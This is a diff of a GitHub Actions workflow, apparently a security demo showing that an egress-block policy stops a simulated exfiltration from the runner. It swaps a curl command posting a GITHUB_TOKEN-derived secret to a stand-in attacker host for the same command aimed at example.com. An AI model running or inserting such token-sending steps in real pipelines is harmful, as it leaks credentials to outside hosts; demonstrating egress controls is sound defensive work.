@@ -77,7 +77,11 @@ jobs:
         # allowlist — egress-policy: block stops it before it leaves the
         # runner, same mechanism as the axios demo, framed as runner-memory
         # exfiltration instead of a compromised postinstall script.
-        run: curl -fsS https://exfil.example-attacker.invalid/beacon -d "token=${RUNNER_SECRET_DEMO}"
+        # example.com (IANA-reserved, resolves in real DNS — confirmed via
+        # dig against 8.8.8.8) stands in for the exfil endpoint: proves the
+        # same egress-block mechanism without touching anything resembling
+        # real attack infrastructure.
+        run: curl -fsS https://example.com/beacon -d "token=${RUNNER_SECRET_DEMO}"
         env:
           RUNNER_SECRET_DEMO: ${{ secrets.GITHUB_TOKEN }}
 
